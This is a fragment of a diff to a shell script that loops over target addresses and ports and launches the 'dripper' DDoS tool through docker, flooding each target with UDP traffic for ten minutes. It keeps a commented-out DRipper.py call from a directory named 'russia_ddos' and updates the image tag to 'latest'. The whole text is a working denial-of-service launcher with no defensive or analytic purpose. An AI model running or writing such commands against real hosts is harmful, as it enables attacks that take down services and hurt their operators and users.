@@ -17,7 +17,7 @@ do
         echo $addr2
         echo $port2
 #        python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr2 -p $port2 -m tcp -t 50&
-        docker run -t --rm alexmon1989/dripper:1.3.8 -s $addr -m udp -p $port -t 50&
+        docker run -t --rm alexmon1989/dripper:latest -s $addr -m udp -p $port -t 50&
 done
 sleep 600
 pkill -9 docker
